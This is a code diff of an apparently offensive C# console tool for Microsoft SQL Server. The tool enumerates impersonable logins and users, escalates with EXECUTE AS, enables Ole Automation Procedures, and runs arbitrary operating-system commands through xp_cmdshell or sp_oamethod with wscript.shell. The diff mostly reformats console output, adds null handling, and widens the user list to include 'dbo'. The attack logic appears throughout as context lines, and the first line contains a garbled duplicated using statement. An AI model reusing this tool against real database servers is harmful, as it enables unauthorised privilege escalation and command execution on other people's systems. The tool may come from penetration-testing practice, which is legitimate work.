@@ -1,4 +1,4 @@
-using System;
+using System;using System;
 using System.Data.SqlClient;
 using System.Collections.Generic;
 
@@ -16,14 +16,14 @@ namespace SQL
             string database = Console.ReadLine();
 
             // Construct the connection string dynamically
-            string conString = $"Server={sqlServer}; Database={database}; Integrated Security=True;MultipleActiveResultSets=true;";
+            string conString = $"Server={sqlServer}; Database={database}; Integrated Security=True; MultipleActiveResultSets=true;";
 
             SqlConnection con = new SqlConnection(conString);
 
             try
             {
                 con.Open(); // Open the connection
-                Console.WriteLine("Connection established successfully.");
+                Console.WriteLine("\n[+] Connection established successfully." + "\n");
 
                 while (true)
                 {
@@ -33,10 +33,10 @@ namespace SQL
                     List<string> linkedServers = ListLinkedServers(con);
 
                     // Display available options
-                    Console.WriteLine("Choose an option:");
-                    Console.WriteLine("1. Impersonate a login (EXECUTE AS LOGIN)");
-                    Console.WriteLine("2. Impersonate a user (EXECUTE AS USER)");
-                    Console.WriteLine("3. List all available SQL links (Linked Servers)");
+                    Console.WriteLine("Choose an option:" + "\n");
+                    Console.WriteLine("\t" + "1. Impersonate a login (EXECUTE AS LOGIN)");
+                    Console.WriteLine("\t" + "2. Impersonate a user (EXECUTE AS USER)");
+                    Console.WriteLine("\t" + "3. List all available SQL links (Linked Servers)" + "\n");
                     Console.Write("Enter 1, 2, or 3: ");
                     string choice = Console.ReadLine();
 
@@ -49,10 +49,10 @@ namespace SQL
                     if (choice == "1")
                     {
                         // Display list of logins to impersonate
-                        Console.WriteLine("Select a login to impersonate:");
+                        Console.WriteLine("\nSelect a login to impersonate:" + "\n");
                         for (int i = 0; i < impersonableLogins.Count; i++)
                         {
-                            Console.WriteLine($"{i + 1}. {impersonableLogins[i]}");
+                            Console.WriteLine($"\t{i + 1}. {impersonableLogins[i]}\n");
                         }
                         Console.Write("Enter the number of the login to impersonate: ");
                         int loginChoice = int.Parse(Console.ReadLine()) - 1;
@@ -70,12 +70,12 @@ namespace SQL
                     else if (choice == "2")
                     {
                         // Display list of users to impersonate
-                        Console.WriteLine("Select a user to impersonate:");
+                        Console.WriteLine("Select a user to impersonate:" + "\n");
                         for (int i = 0; i < impersonableUsers.Count; i++)
                         {
-                            Console.WriteLine($"{i + 1}. {impersonableUsers[i]}");
+                            Console.WriteLine($"\t{i + 1}. {impersonableUsers[i]}");
                         }
-                        Console.Write("Enter the number of the user to impersonate: ");
+                        Console.Write("\nEnter the number of the user to impersonate: ");
                         int userChoice = int.Parse(Console.ReadLine()) - 1;
 
                         if (userChoice >= 0 && userChoice < impersonableUsers.Count)
@@ -128,7 +128,7 @@ namespace SQL
         static List<string> ListImpersonableLogins(SqlConnection con)
         {
             List<string> logins = new List<string>();
-            string query = "SELECT name FROM sys.server_principals WHERE type IN ('S', 'U')"; // Include 'sa'
+            string query = "SELECT name FROM sys.server_principals WHERE type IN ('S', 'U')" + "\n"; // Include 'sa'
             SqlCommand command = new SqlCommand(query, con);
 
             try
@@ -151,7 +151,7 @@ namespace SQL
         static List<string> ListImpersonableUsers(SqlConnection con)
         {
             List<string> users = new List<string>();
-            string query = "SELECT name FROM sys.database_principals WHERE type IN ('S', 'U', 'G') AND name != 'dbo';";
+            string query = "SELECT name FROM sys.database_principals WHERE type IN ('S', 'U', 'G');";
             SqlCommand command = new SqlCommand(query, con);
 
             try
@@ -229,15 +229,15 @@ namespace SQL
                 string impersonateCmd = $"EXECUTE AS LOGIN = '{impersonatedLogin}';";
                 SqlCommand impersonateCommand = new SqlCommand(impersonateCmd, con);
                 impersonateCommand.ExecuteNonQuery();
-                Console.WriteLine($"Impersonating login: {impersonatedLogin}...");
+                Console.WriteLine($"\nImpersonating login: {impersonatedLogin}...\n");
 
                 // Ensure Ole Automation Procedures are enabled
                 EnableOleAutomationProcedures(con);
 
                 // Ask the user to choose between xp_cmdshell or sp_oamethod
-                Console.WriteLine("Choose how to execute the command:");
-                Console.WriteLine("1. Use xp_cmdshell");
-                Console.WriteLine("2. Use sp_oamethod (WScript Shell)");
+                Console.WriteLine("Choose how to execute the command:" + "\n");
+                Console.WriteLine("\t" + "1. Use xp_cmdshell");
+                Console.WriteLine("\t" + "2. Use sp_oamethod (WScript Shell)" + "\n");
                 Console.Write("Enter 1 or 2: ");
                 string execChoice = Console.ReadLine();
 
@@ -248,6 +248,7 @@ namespace SQL
                 if (execChoice == "1")
                 {
                     // Execute using xp_cmdshell
+                    Console.WriteLine();
                     ExecuteCommandWithXpCmdShell(con, usercommand);
                 }
                 else if (execChoice == "2")
@@ -264,7 +265,7 @@ namespace SQL
                 string revertCmd = "REVERT;";
                 SqlCommand revertCommand = new SqlCommand(revertCmd, con);
                 revertCommand.ExecuteNonQuery();
-                Console.WriteLine("Reverted impersonation.");
+                Console.WriteLine("\n" + "Reverted impersonation." + "\n");
             }
             catch (Exception ex)
             {
@@ -282,12 +283,12 @@ namespace SQL
                 string impersonateCmd = $"EXECUTE AS USER = '{impersonatedUser}';";
                 SqlCommand impersonateCommand = new SqlCommand(impersonateCmd, con);
                 impersonateCommand.ExecuteNonQuery();
-                Console.WriteLine($"Impersonating user: {impersonatedUser}...");
+                Console.WriteLine($"Impersonating user: {impersonatedUser}...\n");
 
                 // Ask the user to choose between xp_cmdshell or sp_oamethod
-                Console.WriteLine("Choose how to execute the command:");
-                Console.WriteLine("1. Use xp_cmdshell");
-                Console.WriteLine("2. Use sp_oamethod (WScript Shell)");
+                Console.WriteLine("Choose how to execute the command:" + "\n");
+                Console.WriteLine("\t1. Use xp_cmdshell");
+                Console.WriteLine("\t2. Use sp_oamethod (WScript Shell)" + "\n");
                 Console.Write("Enter 1 or 2: ");
                 string execChoice = Console.ReadLine();
 
@@ -310,7 +311,7 @@ namespace SQL
                 string revertCmd = "REVERT;";
                 SqlCommand revertCommand = new SqlCommand(revertCmd, con);
                 revertCommand.ExecuteNonQuery();
-                Console.WriteLine("Reverted impersonation.");
+                Console.WriteLine("Reverted impersonation." + "\n");
             }
             catch (Exception ex)
             {
@@ -336,7 +337,7 @@ namespace SQL
                         string enableCmdShellQuery = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                         SqlCommand enableCmdShellCommand = new SqlCommand(enableCmdShellQuery, con);
                         enableCmdShellCommand.ExecuteNonQuery();
-                        Console.WriteLine("Enabled Ole Automation Procedures.");
+                        Console.WriteLine("Enabled Ole Automation Procedures.\n");
                     }
                 }
 
@@ -356,9 +357,22 @@ namespace SQL
                 SqlCommand command = new SqlCommand(execCmd, con);
                 SqlDataReader reader = command.ExecuteReader();
 
+                bool hasOutput = false; // Flag to check if there is any output
+
                 while (reader.Read())
                 {
-                    Console.WriteLine(reader.GetString(0)); // Output the command result
+                    string result = reader.IsDBNull(0) ? null : reader.GetString(0); // Check for null values in the result
+
+                    if (result != null)
+                    {
+                        Console.WriteLine(result); // Output the command result if it's not null
+                        hasOutput = true;
+                    }
+                }
+
+                if (!hasOutput)
+                {
+                    Console.WriteLine("No output returned from xp_cmdshell.");
                 }
 
                 reader.Close();
@@ -369,6 +383,7 @@ namespace SQL
             }
         }
 
+
         static void ExecuteCommandWithSpOaMethod(SqlConnection con, string usercommand)
         {
             try
@@ -376,7 +391,7 @@ namespace SQL
                 string execCmd = $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{usercommand}';";
                 SqlCommand command = new SqlCommand(execCmd, con);
                 command.ExecuteNonQuery();
-                Console.WriteLine("Command executed successfully.");
+                Console.WriteLine("\nCommand executed successfully.");
             }
             catch (Exception ex)
             {
